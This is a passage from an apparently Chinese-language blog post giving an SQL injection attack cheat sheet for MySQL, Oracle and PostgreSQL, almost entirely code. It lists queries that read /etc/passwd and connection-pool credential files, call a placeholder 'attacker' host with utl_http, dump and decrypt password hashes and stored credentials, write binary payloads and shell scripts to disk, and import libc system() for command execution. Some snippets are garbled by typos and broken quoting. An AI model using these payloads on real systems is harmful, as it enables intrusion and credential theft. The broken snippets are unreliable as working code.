punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>启用了 MAGIC_QUOTES_GPC,可以使用十六进制字符串代表该文件路径以避免使用单引号字符</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> LOAD_FILE<span class=\"token punctuation\">(</span><span class=\"token number\">0x2f6574632f706173737764</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#加载/etc/passwd</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ul>\n<li>写入文件</li>\n</ul>\n<p>从mytable表中返回所有数据，并将输出写入到/tmp/hacker中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> mytable <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'/tmp/hacker'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Oracle-备忘单\"><a href=\"#Oracle-备忘单\" class=\"headerlink\" title=\"Oracle 备忘单\"></a>Oracle 备忘单</h4><ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取Oracle服务器的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT banner FROM v$version;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT user FROM dual;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT username FROM all users ORDER BY username;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT * FROM user role_privs;</code> <br><code>SELECT * FROM user_tab_privs;</code><br> <code> SELECT * FROM user_sys_privs;</code><br> <code>SELECT sys_context('USERENV','ISDBA') FROM dual;</code><br><code>SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';</code></td>\n</tr>\n<tr>\n<td>应用服务器主机名</td>\n<td><code>SELECT sys_context('USERENV','HOST') FROM dual;</code><br><code>SELECT sys_context('USERENV','SERVER_HOST') FROM dual;</code></td>\n</tr>\n<tr>\n<td>数据库服务器主机名</td>\n<td><code>SELECT UTL_INADDR.get_host_name FROM dual</code></td>\n</tr>\n<tr>\n<td>建立外部连接</td>\n<td>`SELECT utl_http.request(‘<a href=\"http://attacker:1000/\">http://attacker:1000/</a>‘</td>\n</tr>\n<tr>\n<td>引发错误</td>\n<td>引发包含版本标志的错误  <br><code>AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1</code></td>\n</tr>\n</tbody></table>\n<p>提取Oracle数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据库名</td>\n<td><code>SELECT global_name FROM global_name;</code></td>\n</tr>\n<tr>\n<td>列出模式/用户</td>\n<td><code>SELECT username FROM all_users;</code></td>\n</tr>\n<tr>\n<td>列出表名及其模式</td>\n<td><code>SELECT ower,table_name FROM all_users;</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td><code>SELECT ower, table_name, column_name FROM all_tab_columns WHERE table_name= 'tblUsers';</code></td>\n</tr>\n</tbody></table>\n<p>数据库中的加密信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>经过加密的表</td>\n<td><code>SELECT table_name, column_name,  encryption_alg, salt FROM  dba_encrypted_columns;</code> <br> 从Oracle 10g开始，可以对表使用透明加密。考虑到性能原因，通常只对最重要的列进行加密</td>\n</tr>\n<tr>\n<td>列出使用加密库的对象</td>\n<td><code>SELECT owner, name, type, referenced_name  FROM all_dependencies;</code><br>  显示使用了数据库加密的对象(例如，DBMS_CRYPTO和DBMS_OBFUSCATION_TOOLKIT中的密码)</td>\n</tr>\n<tr>\n<td>列出包含’crypt’字符串的PL/SQL函数</td>\n<td><code>SELECT  owner,object_name,procedure_name  FROM all_procedures where  (lower(object_name) LIKE '%crypt%' or lower(procedure_name) like '%crypt%') AND object_name not in ('DBMS OBFUSCATION  TOOLKIT','DBMS_CRYPTO_TOOLKIT')</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数：Oracle</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提 取子串</td>\n<td><code>SELECT SUBSTR(string,offset,length) FROM dual;</code></td>\n</tr>\n<tr>\n<td>字符串（’ABC’）不带 单引号的表示方式</td>\n<td>`SELECT chr(65)</td>\n</tr>\n<tr>\n<td>触发时间延迟</td>\n<td><code>SELECT UTL_INADDR.get_host_address('nowhere999.zom') FROM dual;  -- 触发可度量的时间延迟</code></td>\n</tr>\n</tbody></table>\n<ol start=\"3\">\n<li>攻击数据库服务器：Oracle</li>\n</ol>\n<p>Oracle中存在两种不同类型的注入：传统SQL注入和PL/SQL注入。在PL/SQL注入中， 可以执行整个PL/SQL块；而在传统的SQL注入中，通常则只能修改单条SQL语句。</p>\n<ul>\n<li>命令执行</li>\n</ul>\n<p>使用下列脚本实现系统命令的执行和本地文件的读/写访问:</p>\n<p><a href=\"http://www.0xdeadbeef.infb/exploits/raptor_oraexec.sql\">www.0xdeadbeef.infb/exploits/raptor_oraexec.sql</a></p>\n<p><a href=\"http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql\">www.0xdeadbeef.info/exploits/raptor_oraextproc.sql</a></p>\n<ul>\n<li>读本地文件</li>\n</ul>\n<p>从Oracle服务器读取本地文件</p>\n<p>读本地文件：XMLType</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> directory GETPWDIR <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\APP\\ROOT\\PRODUCT\\11.1.0\\\nDB_1\\OWB\\J2EE\\CONFIG'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@user'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'/'</span><span class=\"token operator\">||</span>\nextractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection—factory/@password'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'@'</span><span class=\"token operator\">||</span>substr\n<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>instr<span class=\"token punctuation\">(</span>extractvalue\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'//'')+2) conn\nFROM table(\nXMLSequence(\nextract(\nxmltype(\nbfilename('</span>GETPWDIR<span class=\"token string\">','</span><span class=\"token keyword\">data</span><span class=\"token operator\">-</span>sources<span class=\"token punctuation\">.</span>xml<span class=\"token string\">'),\nnls_charset_id('</span>WE8ISO8859P1<span class=\"token string\">')\n)/\n'</span><span class=\"token operator\">/</span><span class=\"token keyword\">data</span><span class=\"token operator\">-</span>sources<span class=\"token operator\">/</span>connection<span class=\"token operator\">-</span>pool<span class=\"token operator\">/</span>connection<span class=\"token operator\">-</span>factory'\n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>读本地文件：Oracle Text</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> files <span class=\"token punctuation\">(</span>id NUMBER <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span>path VARCHR<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">UNIQUE</span><span class=\"token punctuation\">,</span>\not_format <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> files <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c:\\boot.ini'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 将准备要读取的列插入到表中(比如通过SQL注入读取)</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">INDEX</span> file_index <span class=\"token keyword\">ON</span> files<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> INDEXTYPE <span class=\"token operator\">IS</span> ctxsys<span class=\"token punctuation\">.</span>context\nPARAMETERS<span class=\"token punctuation\">(</span><span class=\"token string\">'datastore ctxsys.file_datastore format column ot_format'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 从全文索引检索数据(boot.ini)</span>\n<span class=\"token keyword\">SELECT</span> token_text <span class=\"token keyword\">from</span> dr$fi1e_index$i<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>读本地文件(仅限于PL/SQL注入)</li>\n</ul>\n<p>直接连接到数据库来执行PL/SQL块：</p>\n<p>读本地文件：dbms_lob</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">Create</span> <span class=\"token keyword\">or</span> replace <span class=\"token keyword\">directory</span> ext <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\';\nDECLARE\nbuf varchar2(4096);\nBEGIN\nLob_loc:= BFILENAME(1MEDIA_DIR'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aht.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">OPEN</span><span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">,</span> DBMS_LOB<span class=\"token punctuation\">.</span>LOB_READONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">READ</span> <span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndbms_output<span class=\"token punctuation\">.</span>put_line<span class=\"token punctuation\">(</span>utl_raw<span class=\"token punctuation\">.</span>cast_to_varchar2<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">CLOSE</span><span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">*</span> via <span class=\"token keyword\">external</span> <span class=\"token keyword\">table</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> products_ext\n<span class=\"token punctuation\">(</span>prod_id NUMBER<span class=\"token punctuation\">,</span> prod_name VARCHAR2<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> prod_desc VARCHAR2<span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\nprod_category VARCHAR2<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> prod_category_desc VARCHAR2<span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\nlist_price NUMBER<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> min_price NUMBER<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> last_updated <span class=\"token keyword\">DATE</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">ORGANIZATION</span> <span class=\"token keyword\">EXTERNAL</span>\n<span class=\"token punctuation\">(</span>\n<span class=\"token keyword\">TYPE</span> oracle_loader\n<span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">DIRECTORY</span> stage_dir\nACCESS <span class=\"token keyword\">PARAMETERS</span>\n<span class=\"token punctuation\">(</span>RECORDS DELIMITED <span class=\"token keyword\">BY</span> NEWLINE\nBADFILE ORAHOME<span class=\"token operator\">:</span><span class=\"token string\">'.rhosts'</span>\nLOGFILE ORAHOME<span class=\"token operator\">:</span><span class=\"token string\">'log_products_ext'</span>\nFIELDS TERMINATED <span class=\"token keyword\">BY</span> <span class=\"token string\">','</span>\nMISSING FIELD <span class=\"token keyword\">VALUES</span> ARE <span class=\"token keyword\">NULL</span>\n<span class=\"token punctuation\">(</span>prod_id<span class=\"token punctuation\">,</span> prod_name<span class=\"token punctuation\">,</span> prod_desc<span class=\"token punctuation\">,</span> prod_category<span class=\"token punctuation\">,</span> prod_category_desc<span class=\"token punctuation\">,</span> price<span class=\"token punctuation\">,</span> price_delta<span class=\"token punctuation\">,</span>last_updated <span class=\"token keyword\">char</span> date_format <span class=\"token keyword\">date</span> mask <span class=\"token string\">\"dd-mon-yyyy\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\nLOCATION <span class=\"token punctuation\">(</span><span class=\"token string\">'data.txt'</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\nPARALLEL <span class=\"token number\">5</span>\nREJECT <span class=\"token keyword\">LIMIT</span> UNLIMITED<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>写本地文件(仅限于PL/SQL注入)</li>\n</ul>\n<p>通过SQL*Plus等客户端来直接连接到数据库。</p>\n<p>写本地文本文件：utl_file</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">Create</span> <span class=\"token keyword\">or</span> replace <span class=\"token keyword\">directory</span> ext <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\';\nDECLARE\nv_file UTL_FILE.FILE_TYPE;\nBEGIN\nv_file:= UTL_FILE.FOPEN('</span>EXT<span class=\"token string\">', '</span>aht<span class=\"token punctuation\">.</span>txt<span class=\"token string\">','</span>w<span class=\"token string\">');\nUTL_FILE.PUT_LINE(v_file, '</span><span class=\"token keyword\">first</span> <span class=\"token keyword\">row</span><span class=\"token string\">');\nUTL_FILE.NEW_LINE(v_file);\nUTL_FILE.PUT_LINE(v)file,'</span><span class=\"token keyword\">second</span> <span class=\"token keyword\">row</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_FILE<span class=\"token punctuation\">.</span>FCLOSE<span class=\"token punctuation\">(</span>v_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>写本地二进制文件：utl file</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">Create</span> <span class=\"token keyword\">or</span> replace <span class=\"token keyword\">directory</span> ext <span class=\"token keyword\">AS</span> <span class=\"token string\">'C:\\';\nCreate or replace directory ext AS '</span><span class=\"token keyword\">C</span><span class=\"token operator\">:</span>\\'<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">DECLARE</span> fi UTL_FILE<span class=\"token punctuation\">.</span>FILE_TYPE<span class=\"token punctuation\">;</span>\nbu <span class=\"token keyword\">RAW</span><span class=\"token punctuation\">(</span><span class=\"token number\">32767</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\nbu<span class=\"token operator\">:=</span>hextoraw<span class=\"token punctuation\">(</span><span class=\"token string\">'BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfi<span class=\"token operator\">:=</span>UTL_FILE<span class=\"token punctuation\">.</span>fopen<span class=\"token punctuation\">(</span><span class=\"token string\">'EXT'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hello.com'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">,</span><span class=\"token number\">32767</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_FILE<span class=\"token punctuation\">.</span>put_raw<span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">,</span>bu<span class=\"token punctuation\">,</span><span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_FILE<span class=\"token punctuation\">.</span>fclose<span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>写本地文件：dbms_advisor(Oracle 10g及之后的版本)</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">create</span> <span class=\"token keyword\">directory</span> MYDIR <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\';\nexec SYS.DBMS_ADVISOR.CREATE_FILE('</span>This <span class=\"token keyword\">is</span> <span class=\"token keyword\">the</span>\ncontent<span class=\"token string\">'||chr(13)||'</span>Next line<span class=\"token string\">','</span>MYDIR<span class=\"token string\">','</span>myfile<span class=\"token punctuation\">.</span>txt'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>破解数据库口令</li>\n</ul>\n<p>从数据库中提取口令哈希：</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">name</span><span class=\"token punctuation\">,</span> password <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>user$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span>#<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span>\n<span class=\"token keyword\">length</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">--DES Hashes (7-10g)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">name</span><span class=\"token punctuation\">,</span> spare4 <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>user$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span>#<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">length</span><span class=\"token punctuation\">(</span>spare4<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">62</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">--SHA1 Hashes</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>提取明文口令：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> view_username<span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>view_password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> sysman<span class=\"token punctuation\">.</span>mgmt_view_user_credentials<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> credential_set_column<span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>credential_value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> sysman<span class=\"token punctuation\">.</span>mgmt_credentials2<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>aru_username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> sysman<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>aru_password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> sysman<span class=\"token punctuation\">.</span>mgmt_aru_credentials<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"PostgreSQL-备忘单\"><a href=\"#PostgreSQL-备忘单\" class=\"headerlink\" title=\"PostgreSQL 备忘单\"></a>PostgreSQL 备忘单</h4><p><a href=\"http://www.postgresql.org/docs/manuals/\">www.postgresql.org/docs/manuals/</a></p>\n<ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取PostgreSQL数据库的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT version()</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT getpgusername();  </code><br><code>SELECT user; </code><br> <code>SELECT current user; </code> <br><code>SELECT session user;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT usename FROM pg_user</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT  usename, usecreatedb, usesuper, usecatupd FROM pg_user</code></td>\n</tr>\n<tr>\n<td>数据库服务器主机名</td>\n<td><code>SELECT inet_server_addr();</code></td>\n</tr>\n</tbody></table>\n<p>提取PostgreSQL数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数</th>\n<th>查询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT current_database();</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT datname FROM pg_database;</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td><code>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r' ,'') AND pg_catalog.pg_table_is_visible(c.oid) AND n.nspname NOT IN ('pg_catalog','pg_toast');</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td><code>SELECT relname,A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T  WHERE (C.relkind='r') AND (N.nspname ='public') AND  (A.attrelid=C.oid) AND (N.oid=C.relnamespace) AND (A.atttypid=T.oid)  AND(A.attnum&gt;0) AND (NOT A.attisdropped);</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数：PostgreSQL</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SUBSTRING(string,offset,length)</code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC)不带单引号的表示方式</td>\n<td>`SELECT CHR(65)</td>\n</tr>\n<tr>\n<td>触发时间延迟</td>\n<td><code>SELECT pg_sleep(10); --触发10s的延迟</code></td>\n</tr>\n</tbody></table>\n<ol start=\"3\">\n<li>攻击数据库服务器：PostgreSQL</li>\n</ol>\n<p>PostgreSQL并未提供执行操作系统命令的内置存储过程，不过可以从外部的.dll或共享对象(shared object)(.so)文件中导入堵如system()这样的函数。借助PostgreSQL并使用COPY语句同样可以读取本地文件。</p>\n<ul>\n<li>执行系统命令</li>\n</ul>\n<p>对于8.2版本之前的PostgreSQL数据库服务器，从标准UNIX libc库导入system函数：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> system<span class=\"token punctuation\">(</span>cstring<span class=\"token punctuation\">)</span> <span class=\"token keyword\">RETURNS</span> <span class=\"token keyword\">int</span> <span class=\"token keyword\">AS</span> <span class=\"token string\">'/lib/libc.so.6'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'system'</span> <span class=\"token keyword\">LANGUAGE</span> <span class=\"token string\">'C'</span> STRICT<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来可以通过执行下列SQL查询调用system函数：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> system<span class=\"token punctuation\">(</span><span class=\"token string\">'command'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>访问本地文件</li>\n</ul>\n<p>可以使用下列SQL语句并借助超级用户账户来读取本地文件，这些文件是使用操作系统级的PostgreSQL用户账户打开的</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> filedata<span class=\"token punctuation\">(</span>t <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nCOPY filedata <span class=\"token keyword\">FROM</span> <span class=\"token string\">'/etc/passwd'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>可以使用下列SQL语句来写本地文件，这些文件也是使用操作系统级的PostgreSQL用户账户创建的</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> thefile<span class=\"token punctuation\">(</span>evildata <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> thefile<span class=\"token punctuation\">(</span>evildata<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'some evil data'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nCOPY thefile <span class=\"token punctuation\">(</span>evildata<span class=\"token punctuation\">)</span> <span class=\"token keyword\">TO</span> <span class=\"token string\">'/tmp/evilscript.sh'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>破解数据库口令</li>\n</ul>\n<p>列出PostgreSQL数据库中的用户名和口令</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> usename<span class=\"token operator\">||</span><span class=\"token string\">':'</span><span class=\"token operator\">||</span>passwd <span class=\"token keyword\">from</span> pg_shadow<span class=\"token 